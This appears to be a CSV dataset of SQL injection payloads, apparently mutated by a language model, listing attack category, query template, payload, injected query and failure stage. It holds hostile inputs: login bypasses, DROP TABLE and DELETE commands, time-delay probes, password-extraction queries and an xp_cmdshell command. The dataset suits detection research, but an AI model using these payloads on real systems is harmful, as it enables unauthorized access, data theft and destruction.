attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage
tautology,login,; -- DROP TABLE users;,SELECT * FROM users WHERE username = '; -- DROP TABLE users;' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,;--,sandbox
tautology,login,") UNION ALL SELECT 'admin', 'admin' --","SELECT * FROM users WHERE username = ') UNION ALL SELECT 'admin', 'admin' --' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,) OR username='admin' AND password='admin',sandbox
tautology,search,' OR 1=1; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%' OR 1=1; WAITFOR DELAY '0:0:5'; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,";WAITFOR DELAY '0:0:5' AND (CHAR(1)+CHAR(0)+CHAR(0)+CHAR(1))=CHAR(1)+CHAR(0)+CHAR(0)+CHAR(1);--""",judge
tautology,user_lookup,AND 1=1,SELECT * FROM users WHERE id = AND 1=1,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,(SELECT 1),sandbox
tautology,comment_insert,' OR (SELECT COUNT(*) FROM sysobjects WHERE type='U') > 0 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT COUNT(*) FROM sysobjects WHERE type='U') > 0 --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,')) EXEC xp_cmdshell 'ping www.bing.com' --,judge
union_based,login,) OR 1=1 --,SELECT * FROM users WHERE username = ') OR 1=1 --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"') UNION SELECT username,password,1 FROM system_accounts /*",judge
union_based,user_lookup,)) OR 1=1; --,SELECT * FROM users WHERE id = )) OR 1=1; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND EXISTS(SELECT 1 FROM employees WHERE id = 1 OR ABS(MOD(id, 1))) < 1 --",sandbox
union_based,user_lookup,"(IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1),1,0))--","SELECT * FROM users WHERE id = (IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1),1,0))--",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' AND 0=(SELECT COUNT(*) FROM users),sandbox
union_based,comment_insert,'; (SELECT id FROM posts WHERE user_id=1 LIMIT 1); --,"INSERT INTO comments (user_id, body) VALUES (1, ''; (SELECT id FROM posts WHERE user_id=1 LIMIT 1); --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,");
INSERT INTO comments (user_id, body) VALUES (1, (SELECT id FROM posts WHERE user_id=1 LIMIT 1));",sandbox
blind_boolean,search,"' OR CAST(SUBSTRING(username,1,1) AS CHAR)='a' --","SELECT * FROM products WHERE name LIKE '%' OR CAST(SUBSTRING(username,1,1) AS CHAR)='a' --%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=CASE WHEN (SELECT SUBSTRING(CAST((SELECT ASCII(SUBSTRING(username, 1, 1)) AS VARCHAR(2)), 1, 1)=97) THEN 1 ELSE 0 END --",sandbox
blind_boolean,search,"; (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) * 0; --","SELECT * FROM products WHERE name LIKE '%; (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1) * 0; --%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND (SELECT (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE id=1 LIMIT 1) > 0)--",sandbox
blind_boolean,user_lookup,") OR ASCII(SUBSTRING(username,1,1)) * 0; --","SELECT * FROM users WHERE id = ) OR ASCII(SUBSTRING(username,1,1)) * 0; --",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=CAST(ASCII(SUBSTRING(username, 1, 1)) AS INT)#",sandbox
blind_boolean,order_filter,OR 1<>0 -- -,SELECT * FROM orders WHERE status = 'OR 1<>0 -- -' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' OR 1=1 SET NOCOUNT ON --,judge
blind_boolean,comment_insert,*/; SELECT * FROM users WHERE id=1; -- -,"INSERT INTO comments (user_id, body) VALUES (1, '*/; SELECT * FROM users WHERE id=1; -- -')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,*/; DECLARE @x INT = 1; WHILE @x > 0 BEGIN WAITFOR DELAY '00:00:01'; SET @x = 0 END/*,judge
blind_boolean,comment_insert,*/; EXECUTE ('WAITFOR DELAY ''00:00:03'' AND 1=1'); -- -,"INSERT INTO comments (user_id, body) VALUES (1, '*/; EXECUTE ('WAITFOR DELAY ''00:00:03'' AND 1=1'); -- -')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,*/; DECLARE @y INT = 1; WHILE @y > 0 BEGIN WAITFOR DELAY '00:00:02'; SET @y = 0 END--,judge
blind_time,login,); WAITFOR DELAY '00:00:3'; --,SELECT * FROM users WHERE username = '); WAITFOR DELAY '00:00:3'; --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,""") AND (WAITFOR DELAY '00:00:3')--""",judge
blind_time,search,%'; WAITFOR DELAY '0:0:1'; --,SELECT * FROM products WHERE name LIKE '%%'; WAITFOR DELAY '0:0:1'; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' OR (WAITFOR DELAY '0:0:1') --,judge
blind_time,user_lookup,) AND (SELECT CASE WHEN (id = 1) THEN 1 ELSE 1/(SELECT id FROM users WHERE username LIKE '%admin%')) END),SELECT * FROM users WHERE id = ) AND (SELECT CASE WHEN (id = 1) THEN 1 ELSE 1/(SELECT id FROM users WHERE username LIKE '%admin%')) END),1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,) AND (EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%'))),sandbox
blind_time,user_lookup,); WAITFOR DELAY '0:0:10'; --,SELECT * FROM users WHERE id = ); WAITFOR DELAY '0:0:10'; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,'; WAITFOR DELAY '0:0:10'--,judge
blind_time,user_lookup,); WAITFOR DELAY '00:00:8'; --,SELECT * FROM users WHERE id = ); WAITFOR DELAY '00:00:8'; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,/* */' AND EXISTS(SELECT 1 FROM users WHERE id = 1 AND sleep(8))--,judge
blind_time,order_filter,; WAITFOR DELAY '0:0:7' /* Exploit user session delay */,SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:7' /* Exploit user session delay */' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,'; WAITFOR DELAY '0:0:7 --,judge
blind_time,comment_insert,-- MySQL server version check DELETE FROM comments /* Exploit to delete comments */,"INSERT INTO comments (user_id, body) VALUES (1, '-- MySQL server version check DELETE FROM comments /* Exploit to delete comments */')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:4' IF @@VERSION LIKE '%MySQL%'--,judge
blind_time,comment_insert,) OR 1=1 /* Exploit to bypass admin authentication */,"INSERT INTO comments (user_id, body) VALUES (1, ') OR 1=1 /* Exploit to bypass admin authentication */')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,';WAITFOR DELAY '0:0:2' IF USER_ID='admin' AND USER_NAME='root'--,judge
stacked_queries,login,); DELETE FROM sessions /* Exploit to delete all sessions */,SELECT * FROM users WHERE username = '); DELETE FROM sessions /* Exploit to delete all sessions */' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:5'; --,judge
stacked_queries,login,; DROP TABLE temp_table --,SELECT * FROM users WHERE username = '; DROP TABLE temp_table --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"UNION ALL SELECT username, password FROM users WHERE 1=1;",sandbox
stacked_queries,search,' AND 1=1; --,SELECT * FROM products WHERE name LIKE '%' AND 1=1; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' OR '1'='1'; -- temp_union
UNION SELECT 'b'
FROM (SELECT NULL AS NULL) AS temp_null
WHERE '1'='1'",judge
stacked_queries,user_lookup,' AND 1=1; --,SELECT * FROM users WHERE id = ' AND 1=1; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=1; -- temp_waitfor
WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password FROM admin_table --",judge
stacked_queries,order_filter,') AND EXISTS(SELECT * FROM orders WHERE status != 'completed'); --,SELECT * FROM orders WHERE status = '') AND EXISTS(SELECT * FROM orders WHERE status != 'completed'); --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"') AND EXISTS(SELECT * FROM orders WHERE status = 'pending'); -- temp_delay
delay '0:0:10' DROP TABLE orders--",judge
stacked_queries,order_filter,() OR EXISTS(SELECT * FROM orders WHERE status = 'pending'); --,SELECT * FROM orders WHERE status = '() OR EXISTS(SELECT * FROM orders WHERE status = 'pending'); --' ORDER BY date DESC,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,; WAITFOR DELAY '0:0:10'; DROP TABLE users;,judge
stacked_queries,comment_insert,-- DROP TABLE comments;,"INSERT INTO comments (user_id, body) VALUES (1, '-- DROP TABLE comments;')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' DROP TABLE comments;--,judge
comment_obfuscation,user_lookup,--# select */* from users where id = (select id from users where username like 'a%' limit 1);,SELECT * FROM users WHERE id = --# select */* from users where id = (select id from users where username like 'a%' limit 1);,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"/*#select*/ username AS ""u"" /*from*//*users*//*where*//*id*//=/*(SELECT id FROM users WHERE username LIKE 'a%' LIMIT 1))) --",judge
